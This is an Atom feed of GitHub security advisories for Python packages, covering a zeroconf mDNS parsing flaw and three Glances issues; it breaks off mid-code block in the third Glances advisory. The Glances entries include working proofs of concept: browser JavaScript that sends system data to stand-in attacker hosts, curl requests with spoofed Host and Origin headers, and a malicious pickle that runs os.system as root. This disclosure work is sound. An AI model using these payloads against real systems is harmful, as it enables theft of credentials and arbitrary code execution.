<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-23T05:17:08.919Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf: Unvalidated rdlength in record payload readers allows LAN-local cache corruption via crafted mDNS packet]]></title>
        <id>https://github.com/advisories/GHSA-qc2x-6f54-m6h9</id>
        <link href="https://github.com/advisories/GHSA-qc2x-6f54-m6h9"/>
        <updated>2026-06-22T23:07:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>_read_character_string</code> and <code>_read_string</code> in <code>src/zeroconf/_protocol/incoming.py</code> sliced <code>self.data[self.offset : self.offset + length]</code> and advanced <code>self.offset</code> by the declared <code>length</code> without checking it against <code>self._data_len</code>. Python's slice silently returns fewer bytes when the end index runs past the buffer, so a record whose 16-bit RDLENGTH (RFC 1035 §3.2.1) over-advertised by tens of kilobytes was constructed from a truncated payload, appended to <code>DNSIncoming._answers</code>, and committed to the cache before any later parse failure surfaced. The follow-up <code>_read_name</code> for the next record then failed, but the corrupt record had already entered the answer list and propagated to <code>DNSCache</code> and <code>ServiceInfo</code>.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can multicast a single mDNS response carrying a TXT, HINFO, or A/AAAA record that advertises rdlength=65535 and only a handful of real payload bytes; consumers calling <code>ServiceInfo.properties</code> then parse the truncated bytes as if they matched the wire, and downstream integrations (Home Assistant and other zeroconf-driven discovery) trust the decoded record. The bug is parser-state desync rather than RCE, but it seeds the cache with attacker-shaped key/value and address records for a TTL window and is a building block for higher-impact chains.</p>
<p>The impact is likely lower than the other recently released advisories as there is no additional risk of OOM so the severity was manually set to low to override the score CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (6.5, Medium) since that doesn't fully consider the mDNS threat model.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.16 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1756">PR #1756</a>).  Note that this change originally intended to ship in 0.149.13 but we ran out of space on PyPI: see <a href="https://github.com/python-zeroconf/python-zeroconf/issues/1769">https://github.com/python-zeroconf/python-zeroconf/issues/1769</a></p>
<p>Upgrade to <code>&gt;= 0.149.16</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1756">PR #1756</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1752">Issue #1752</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc1035#section-3.2.1">RFC 1035 §3.2.1</a>, <a href="https://www.rfc-editor.org/rfc/rfc1035#section-3.3">RFC 1035 §3.3</a>, <a href="https://cwe.mitre.org/data/definitions/130.html">CWE-130</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-qc2x-6f54-m6h9">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-qc2x-6f54-m6h9</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1752">https://github.com/python-zeroconf/python-zeroconf/issues/1752</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1756">https://github.com/python-zeroconf/python-zeroconf/pull/1756</a></li>
<li><a href="https://github.com/advisories/GHSA-qc2x-6f54-m6h9">https://github.com/advisories/GHSA-qc2x-6f54-m6h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc2x-6f54-m6h9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T23:07:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances: XML-RPC Server Missing Host Header Validation Enables DNS Rebinding Attack]]></title>
        <id>https://github.com/advisories/GHSA-w856-8p3r-p338</id>
        <link href="https://github.com/advisories/GHSA-w856-8p3r-p338"/>
        <updated>2026-06-22T21:31:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Glances XML-RPC server (<code>glances -s</code>, implemented in <code>glances/server.py</code>) does not validate the HTTP <code>Host</code> header, leaving it vulnerable to DNS rebinding attacks.  CVE-2026-32632 (patched in 4.5.2) added <code>TrustedHostMiddleware</code> to the REST/WebUI server; the MCP server has had equivalent protection since 4.5.1. The XML-RPC server received neither fix and has no <code>allowed-hosts</code> configuration key.  Combined with the unrestricted <code>Access-Control-Allow-Origin: *</code> header (see companion advisory for CVE-2026-33533 and its incomplete fix), an attacker can exploit DNS rebinding to exfiltrate the full system monitoring dataset from a victim's browser.</p>
<hr>
<h3 id="details">Details</h3>
<p><strong>Affected component:</strong> <code>glances/server.py</code> — <code>GlancesXMLRPCHandler</code> / <code>GlancesXMLRPCServer</code></p>
<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py</a></li>
</ul>
<p>Contrast — patched backends:</p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_restful_api.py">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_restful_api.py</a></li>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_mcp.py">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_mcp.py</a></li>
</ul>
<p>The <code>GlancesXMLRPCHandler</code> class inherits from Python's <code>xmlrpc.server.SimpleXMLRPCRequestHandler</code> and does not override <code>parse_request()</code> to inspect or validate the <code>Host</code> header.</p>
<p>Contrast this with the two other Glances server backends, both of which received host-validation hardening:</p>
<p><strong>REST / WebUI server</strong> (<code>glances/outputs/glances_restful_api.py</code>) — patched in 4.5.2:</p>
<pre><code class="language-python"># glances_restful_api.py
if self.webui_allowed_hosts:
    self._app.add_middleware(
        TrustedHostMiddleware,
        allowed_hosts=self.webui_allowed_hosts,
    )
</code></pre>
<p><strong>MCP server</strong> (<code>glances/outputs/glances_mcp.py</code>) — protected since 4.5.1:</p>
<pre><code class="language-python"># glances_mcp.py
TransportSecuritySettings(
    allowed_hosts=self.mcp_allowed_hosts,
    ...
)
</code></pre>
<p><strong>XML-RPC server</strong> (<code>glances/server.py</code>) — no equivalent exists:</p>
<pre><code class="language-python">class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):
    # No Host header check; any Host value is accepted
    rpc_paths = ('/RPC2',)
    ...
</code></pre>
<p>There is no <code>xmlrpc_allowed_hosts</code> (or equivalent) configuration key in <code>glances.conf</code>, and the server ignores the <code>Host</code> header on every incoming request.</p>
<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
<p>Test results:</p>
<table>
<thead>
<tr>
<th>Server type</th>
<th>Host header</th>
<th>HTTP status</th>
<th>Data returned</th>
</tr>
</thead>
<tbody><tr>
<td>XML-RPC</td>
<td><code>attacker.example.com</code></td>
<td>200 OK</td>
<td>Yes — VULNERABLE</td>
</tr>
<tr>
<td>XML-RPC</td>
<td><code>127.0.0.1:61209</code></td>
<td>200 OK</td>
<td>Yes (baseline)</td>
</tr>
<tr>
<td>REST API</td>
<td><code>attacker.example.com</code></td>
<td>400 Bad Request</td>
<td>No — patched</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Attack overview</strong></p>
<p>DNS rebinding breaks the browser Same-Origin Policy by making <code>attacker.example.com</code> temporarily resolve to the target's IP address (e.g. <code>127.0.0.1</code>).  From that point the victim's browser treats the attacker's page as same-origin with <code>http://attacker.example.com:61209/RPC2</code>, forwarding the attacker-controlled <code>Host</code> header to the local Glances XML-RPC server, which accepts it without validation.</p>
<p><strong>Special configuration required</strong></p>
<p>No special <code>glances.conf</code> settings are needed.  The vulnerability is present in a default Glances XML-RPC server start (<code>glances -s</code>).  For the comparison test (Step 3) the REST server must also be started; that step requires Glances to be installed with web dependencies (<code>pip install "glances[web]"</code>).</p>
<hr>
<p><strong>Step 1 — Start the Glances XML-RPC server</strong></p>
<pre><code class="language-bash">glances -s -p 61209
</code></pre>
<p><strong>Step 2 — Confirm the server accepts an arbitrary Host header</strong></p>
<pre><code class="language-bash">curl -s -D - -X POST "http://127.0.0.1:61209/RPC2" \
     -H "Host: attacker.example.com" \
     -H "Content-Type: text/plain" \
     -d '&lt;?xml version="1.0"?&gt;
         &lt;methodCall&gt;&lt;methodName&gt;getAllPlugins&lt;/methodName&gt;&lt;/methodCall&gt;'
</code></pre>
<p>Expected result (secure): <code>HTTP/1.0 400 Bad Request</code>
Actual result: <code>HTTP/1.0 200 OK</code> with full XML-RPC response body.</p>
<p><strong>Step 3 — Confirm the REST API is patched (comparison)</strong></p>
<pre><code class="language-bash"># Start REST server with the same machine as allowed host:
glances -w -p 61210 --webui-port 61210

curl -s -o /dev/null -w "%{http_code}\n" \
     "http://127.0.0.1:61210/api/4/status" \
     -H "Host: attacker.example.com"
# Returns: 400   (TrustedHostMiddleware rejects the spoofed Host)
</code></pre>
<p><strong>Step 4 — Full DNS rebinding exploitation (real-world path)</strong></p>
<ol>
<li>Attacker registers <code>attacker.example.com</code> with a low-TTL (1 second) DNS record initially pointing to their own server IP.</li>
<li>Attacker serves the following page from <code>http://attacker.example.com</code>:</li>
</ol>
<pre><code class="language-html">&lt;script&gt;
async function exfil() {
  const payload = `&lt;?xml version="1.0"?&gt;
    &lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;`;
  try {
    const r = await fetch('http://attacker.example.com:61209/RPC2', {
      method:  'POST',
      headers: { 'Content-Type': 'text/plain' },
      body:    payload,
    });
    const data = await r.text();
    // data contains: hostname, OS, all processes with cmd-lines, network, disk
    await fetch('https://collect.attacker.example.com/?d=' + btoa(data));
  } catch (_) {}
}

// Wait for TTL to expire and DNS to rebind to 127.0.0.1, then call exfil()
setTimeout(exfil, 5000);
&lt;/script&gt;
</code></pre>
<ol start="3">
<li>Victim visits <code>http://attacker.example.com</code> in their browser.</li>
<li>After TTL expiry, the attacker's DNS server responds with <code>127.0.0.1</code>.</li>
<li>The browser's <code>fetch()</code> call is sent to <code>127.0.0.1:61209</code> with <code>Host: attacker.example.com</code>; the XML-RPC server accepts it.</li>
<li>The <code>Access-Control-Allow-Origin: *</code> header (see companion advisory) allows the browser to read the response body.</li>
<li>The attacker receives the complete system monitoring snapshot.</li>
</ol>
<p>Tools that simplify DNS rebinding for research/testing include:</p>
<ul>
<li><a href="https://github.com/nccgroup/singularity">Singularity</a></li>
<li><a href="https://rbndr.us">rbndr.us</a></li>
</ul>
<p><strong>Step 5 — Confirm absence of Host check in source</strong></p>
<pre><code class="language-python">import sys, inspect
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
import glances.server as s

src = inspect.getsource(s.GlancesXMLRPCHandler)
print('Host check present:', 'allowed_hosts' in src or 'Host' in src)
# Host check present: False
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> Insufficient Verification of Data Authenticity / DNS Rebinding (CWE-350)</p>
<p><strong>Who is impacted:</strong> Any user whose browser can reach a Glances XML-RPC server and who can be lured to visit an attacker controlled web page.  This includes deployments where:</p>
<ul>
<li>Glances is bound to <code>127.0.0.1</code> (loopback) — DNS rebinding bypasses the loopback restriction.</li>
<li>Glances is bound to a LAN IP — any browser on that LAN is at risk.</li>
<li>Glances is exposed on a public IP — any browser on the internet is at risk.</li>
</ul>
<p><strong>Data exposed through the XML-RPC API</strong> includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, database passwords, and access tokens passed as environment variables or CLI flags), CPU/memory/disk/network statistics, open file descriptors, listening ports, and Docker/Kubernetes container metadata.</p>
<p><strong>Impact:</strong></p>
<ul>
<li><strong>Confidentiality:</strong> High — complete system monitoring data readable remotely without credentials.</li>
<li><strong>Integrity:</strong> None — read-only XML-RPC API.</li>
<li><strong>Availability:</strong> None — no denial-of-service component.</li>
</ul>
<p>The attack is amplified by the companion CORS wildcard issue (vuln03): without <code>Access-Control-Allow-Origin: *</code>, the browser would still block the response read.  Both issues must be fixed together for effective remediation.</p>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<p><strong>Option 1 — Add Host validation to the XML-RPC handler (preferred)</strong></p>
<p>Add a <code>webui_allowed_hosts</code> (or new <code>xmlrpc_allowed_hosts</code>) configuration key, and validate the <code>Host</code> header in <code>GlancesXMLRPCHandler</code>:</p>
<pre><code class="language-python"># server.py
class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):

    allowed_hosts: list[str] = []   # populated from config

    def parse_request(self) -&gt; bool:
        if not super().parse_request():
            return False
        if self.allowed_hosts:
            host = self.headers.get('Host', '').split(':')[0]
            if host not in self.allowed_hosts:
                self.send_error(400, 'Bad Request: invalid Host header')
                return False
        return True
</code></pre>
<p>Populate <code>allowed_hosts</code> from the existing <code>webui_allowed_hosts</code> config key (already used by the REST server), so operators have a single knob.</p>
<p><strong>Option 2 — Deprecate and remove the XML-RPC server</strong></p>
<p>The XML-RPC server is a legacy interface.  The REST API (<code>glances -w</code>) provides a superset of functionality, is actively maintained, and has all current security controls.  Deprecating the XML-RPC server in the next major release and directing users to the REST API would eliminate this attack surface entirely.</p>
<hr>
<h3 id="responsible-disclosure">Responsible Disclosure</h3>
<h2 id="the-afine-team-is-committed-to-responsible--coordinated-disclosure--the-afine-team-will-not-publish-details-of-this-vulnerability-or-release-exploit-code-publicly-until-a-fix-has-been-released-or-90-days-have-elapsed-from-the-date-of-this-report-whichever-comes-first">The AFINE Team is committed to responsible / coordinated disclosure.  The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first. </h2>
<h3 id="credits">Credits</h3>
<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-w856-8p3r-p338">https://github.com/nicolargo/glances/security/advisories/GHSA-w856-8p3r-p338</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-w856-8p3r-p338">https://github.com/advisories/GHSA-w856-8p3r-p338</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w856-8p3r-p338</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T21:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances: XML-RPC Multi-Origin CORS Configuration Silently Falls Back to Wildcard (Incomplete Fix for CVE-2026-33533)]]></title>
        <id>https://github.com/advisories/GHSA-87qc-fj39-wccr</id>
        <link href="https://github.com/advisories/GHSA-87qc-fj39-wccr"/>
        <updated>2026-06-22T21:27:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Glances XML-RPC server (<code>glances -s</code>) introduced a configurable CORS origin list in version 4.5.3 as a mitigation for CVE 2026-33533.  However, the implementation silently falls back to <code>Access-Control-Allow-Origin: *</code> whenever <code>cors_origins</code> contains more than one entry.  An operator who configures an explicit two-entry allowlist (e.g. two internal dashboard origins) intending to restrict browser access instead receives the unrestricted wildcard — the same exposure that the original CVE described.  A malicious web page served from any origin can issue a CORS simple request to <code>/RPC2</code> and read the full system monitoring dataset without the victim's knowledge.</p>
<hr>
<h3 id="details">Details</h3>
<p><strong>Affected file:</strong> <code>glances/server.py</code>, class <code>GlancesXMLRPCServer</code>, line 113</p>
<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113</a></li>
</ul>
<pre><code class="language-python"># server.py  (GlancesXMLRPCServer.__init__)
cors_origins = self.args.cors_origins   # list from config / CLI

# Line 113 — the incomplete fix:
self.cors_origin = cors_origins[0] if len(cors_origins) == 1 else '*'
#                                                                  ^^^
# Any allowlist with 2+ entries collapses to the wildcard
</code></pre>
<p>The <code>cors_origin</code> value is then echoed back as the <code>Access-Control-Allow-Origin</code> response header for every request (line ~147 in the same file):</p>
<pre><code class="language-python">self.send_header('Access-Control-Allow-Origin', self.cors_origin)
</code></pre>
<p>This means the CORS header is determined once at server startup and never compared against the actual <code>Origin</code> header sent by the browser.  Even if an operator sets:</p>
<pre><code class="language-ini"># glances.conf
[outputs]
cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
</code></pre>
<p>the server responds with <code>Access-Control-Allow-Origin: *</code> to every request, including those from <code>https://attacker.example.com</code>.</p>
<p><strong>Single-origin wildcard</strong> (the default, <code>cors_origins = *</code>) is also still in effect; the fix only helps if exactly one non-wildcard origin is configured.</p>
<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
<p>Test results:</p>
<table>
<thead>
<tr>
<th>Origin sent</th>
<th>ACAO header returned</th>
<th>Expected</th>
</tr>
</thead>
<tbody><tr>
<td><code>http://evil.example.com</code></td>
<td><code>*</code></td>
<td>No header</td>
</tr>
<tr>
<td><code>https://dashboard.corp</code></td>
<td><code>*</code></td>
<td>Reflected</td>
</tr>
<tr>
<td><code>https://grafana.corp</code></td>
<td><code>*</code></td>
<td>Reflected</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Special configuration required</strong></p>
<p>The multi-origin collapse is only triggered when <code>cors_origins</code> contains two or more entries.  Create the following <code>glances.conf</code>:</p>
<pre><code class="language-ini"># /tmp/glances_multiorigin.conf
[global]
check_update = false

[outputs]
cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
</code></pre>
<p><strong>Step 1 — Start the XML-RPC server using the config above</strong></p>
<pre><code class="language-bash">glances -s -p 61209 -C /tmp/glances_multiorigin.conf
</code></pre>
<p><strong>Step 2 — Send a CORS simple request from a foreign origin</strong></p>
<pre><code class="language-bash">curl -s -D - -X POST "http://TARGET_HOST:61209/RPC2" \
     -H "Content-Type: text/plain" \
     -H "Origin: http://evil.example.com" \
     -d '&lt;?xml version="1.0"?&gt;
         &lt;methodCall&gt;&lt;methodName&gt;getAllPlugins&lt;/methodName&gt;&lt;/methodCall&gt;'
</code></pre>
<p><strong>Expected (secure) response:</strong></p>
<pre><code>HTTP/1.0 400 Bad Request
</code></pre>
<p>or no <code>Access-Control-Allow-Origin</code> header.</p>
<p><strong>Actual response:</strong></p>
<pre><code>HTTP/1.0 200 OK
Access-Control-Allow-Origin: *
...
&lt;?xml version='1.0'?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
    &lt;value&gt;&lt;string&gt;cpu&lt;/string&gt;&lt;/value&gt;
    &lt;value&gt;&lt;string&gt;mem&lt;/string&gt;&lt;/value&gt;
    ...
  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodResponse&gt;
</code></pre>
<p><strong>Step 3 — Demonstrate the code-level collapse to wildcard</strong></p>
<pre><code class="language-python">import sys
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
from glances.config import Config

c = Config('/tmp/glances_multiorigin.conf')
cors_list = c.get_list_value('outputs', 'cors_origins', default=['*'])
# Reproduces server.py line 113:
result = cors_list[0] if len(cors_list) == 1 else '*'

print('cors_origins config :', cors_list)
print('cors_origin applied :', result)
print('Is wildcard?        :', result == '*')
# cors_origins config : ['https://dashboard.corp.example.com', 'https://grafana.corp.example.com']
# cors_origin applied : *
# Is wildcard?        : True
</code></pre>
<p><strong>Browser-based exploitation</strong></p>
<p>Once the wildcard is confirmed, the original CVE-2026-33533 attack vector still applies in full.  A malicious page served to a victim whose browser can reach the Glances server can exfiltrate data as follows:</p>
<pre><code class="language-javascript">// Runs in a page on http://evil.example.com
const payload = `&lt;?xml version="1.0"?&gt;
  &lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;`;

fetch('http://GLANCES_HOST:61209/RPC2', {
  method: 'POST',
  headers: { 'Content-Type': 'text/plain' },
  body: payload,
})
.then(r =&gt; r.text())
.then(data =&gt; {
  // 'data' contains hostname, OS, full process list, network interfaces, etc.
  fetch('https://attacker.example.com/collect?d=' + btoa(data));
});
</code></pre>
<p>This works as a CORS "simple request" (POST + <code>text/plain</code>) — no CORS preflight is triggered and the <code>*</code> wildcard allows the browser to read the response.</p>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> CORS Misconfiguration / Bypass of CVE-2026-33533 mitigation (CWE-942)</p>
<p><strong>Who is impacted:</strong> Any operator who:</p>
<ol>
<li>Runs Glances in XML-RPC server mode (<code>glances -s</code>), <em>and</em></li>
<li>Has configured two or more <code>cors_origins</code> entries in <code>glances.conf</code> believing
they are restricting browser access.</li>
</ol>
<p>Operators using the default single-wildcard configuration (<code>cors_origins = *</code>, which is the upstream default) remain affected by the original CVE-2026-33533 exposure (unrestricted cross-origin read).  The incomplete fix addresses only the narrow case of a single non-wildcard origin.</p>
<p><strong>Data exposed through the XML-RPC API</strong> includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, passwords, and tokens), CPU/memory/disk/network statistics, listening ports, and Docker/Kubernetes container metadata.</p>
<p><strong>Impact:</strong></p>
<ul>
<li><strong>Confidentiality:</strong> High — complete system monitoring data readable by any browser page.</li>
<li><strong>Integrity:</strong> None — read-only API.</li>
<li><strong>Availability:</strong> None — no denial-of-service component.</li>
</ul>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Implement per-request origin reflection against the configured allowlist, as recommended by the W3C CORS specification and as done by modern CORS middleware (e.g. Starlette's <code>CORSMiddleware</code>):</p>
<pre><code class="language-python"># server.py  — replace the single static self.cors_origin field with:

def _get_acao_header(self, request_origin: str) -&gt; str | None:
    """Return the correct Access-Control-Allow-Origin value or None."""
    if not self.cors_origins or '*' in self.cors_origins:
        return '*'
    if request_origin in self.cors_origins:
        return request_origin
    return None   # do not send the header for unlisted origins

# In do_POST / send_response:
origin = self.headers.get('Origin', '')
acao   = self._get_acao_header(origin)
if acao:
    self.send_header('Access-Control-Allow-Origin', acao)
    self.send_header('Vary', 'Origin')
</code></pre>
<p>Additionally, consider retiring the legacy XML-RPC server in favour of the REST API (<code>glances -w</code>), which uses Starlette's <code>CORSMiddleware</code> correctly, and document the deprecation path.</p>
<hr>
<h3 id="responsible-disclosure">Responsible Disclosure</h3>
<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
<hr>
<h3 id="credits">Credits</h3>
<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr">https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-87qc-fj39-wccr">https://github.com/advisories/GHSA-87qc-fj39-wccr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87qc-fj39-wccr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T21:27:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances has Insecure Pickle Deserialization in its Version Cache that Leads to Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-9837-48hr-q32j</id>
        <link href="https://github.com/advisories/GHSA-9837-48hr-q32j"/>
        <updated>2026-06-22T21:21:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>glances/outdated.py</code> uses <code>pickle.load()</code> to read a version-check cache file stored at a predictable, world-accessible path (<code>~/.cache/glances/glances-version.db</code> or <code>$XDG_CACHE_HOME/glances/glances-version.db</code>). No integrity check, signature verification, or format validation is performed before deserialization.  An attacker with write access to that path — through any of several realistic local or container-level scenarios — can plant a malicious pickle file and achieve arbitrary code execution as the OS user running Glances the next time it starts with version checking enabled (the default).</p>
<hr>
<h3 id="details">Details</h3>
<p><strong>Affected file:</strong> <code>glances/outdated.py</code>, method <code>Outdated._load_cache()</code>, line 121</p>
<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121</a></li>
</ul>
<pre><code class="language-python"># outdated.py  (_load_cache, line 119-127)
try:
    with open(self.cache_file, 'rb') as f:
        cached_data = pickle.load(f)          # ← no integrity check
except Exception as e:
    logger.debug(f"Cannot read version from cache file: {self.cache_file} ({e})")
    ...
</code></pre>
<p><code>self.cache_file</code> is constructed from the XDG cache directory path at <code>Outdated.__init__()</code>:</p>
<pre><code class="language-python"># outdated.py  (__init__)
self.cache_file = os.path.join(
    user_cache_dir('glances')[0],
    'glances-version.db'
)
</code></pre>
<p>On a default Linux installation this resolves to <code>/home/john/.cache/glances/glances-version.db</code> (or <code>/root/.cache/glances/…</code> when Glances runs as root).</p>
<p>Python's <code>pickle</code> module is an execution-capable serialisation format: any class that implements <code>__reduce__</code> can embed an arbitrary callable and argument tuple that Python will invoke unconditionally at <code>pickle.load()</code> time.  There is no safe subset of pickle; the only safe mitigation is to not use it for untrusted data.</p>
<p>The code was verified on x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).  A malicious pickle crafted with <code>os.system()</code> via <code>__reduce__</code> executed the injected shell command successfully before the surrounding Python code raised a <code>TypeError</code>.</p>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Special configuration required</strong></p>
<p>No non-default Glances configuration is needed.  Version checking is enabled by default (<code>check_update = true</code>).  The only pre condition is that the attacker can write to the Glances user's XDG cache directory — see the attack scenarios below for how this arises in practice.</p>
<hr>
<p><strong>Attack scenario A — local privilege escalation (shared multi-user host)</strong></p>
<p>Prerequisites: Glances runs periodically (e.g. via systemd or cron) as a privileged user (root or a dedicated monitoring account).  The attacker is an unprivileged local user who has write access to the Glances user's <code>~/.cache/glances/</code> directory (e.g. the directory or an ancestor is group- or world-writable, or was created with overly permissive umask).</p>
<p><strong>Step 1 — Identify the cache path</strong></p>
<pre><code class="language-bash">python3 -c "from glances.config import user_cache_dir; print(user_cache_dir()[0])"
# Example output: /root/.cache/glances
</code></pre>
<p><strong>Step 2 — Craft and plant a malicious pickle</strong></p>
<pre><code class="language-python">import pickle, os, pathlib

class MaliciousPayload:
    def __reduce__(self):
        # This command runs as the Glances process user
        cmd = 'id &gt;&gt; /tmp/glances_rce_proof.txt'
        return (os.system, (cmd,))

cache_dir  = pathlib.Path('/root/.cache/glances')   # adjust to target
cache_file = cache_dir / 'glances-version.db'
cache_dir.mkdir(parents=True, exist_ok=True)
cache_file.write_bytes(pickle.dumps(MaliciousPayload()))
print(f'Payload written to {cache_file}')
</code></pre>
<p><strong>Step 3 — Wait for Glances to start (or restart it)</strong></p>
<p>Glances calls <code>_load_cache()</code> automatically at startup when <code>check_update = true</code> (the compiled-in default). No special configuration is required by the attacker.</p>
<p><strong>Step 4 — Verify execution</strong></p>
<pre><code class="language-bash">cat /tmp/glances_rce_proof.txt
# uid=0(root) gid=0(root) groups=0(root)    ← output from the Glances-user context
</code></pre>
<hr>
<p><strong>Attack scenario B — container / shared-volume poisoning</strong></p>
<p>A compromised container that shares a Docker/Podman volume with the Glances container can write to the cache path on the shared volume. The next time Glances restarts (e.g. after a rolling update), the payload executes inside the Glances container with its privileges.</p>
<hr>
<p><strong>Attack scenario C — symlink race (TOCTOU)</strong></p>
<p>Before the Glances cache directory is created for the first time (e.g. on a fresh installation), an attacker with write access to <code>~/.cache/</code> can create a symlink:</p>
<pre><code class="language-bash">mkdir -p /home/john/.cache
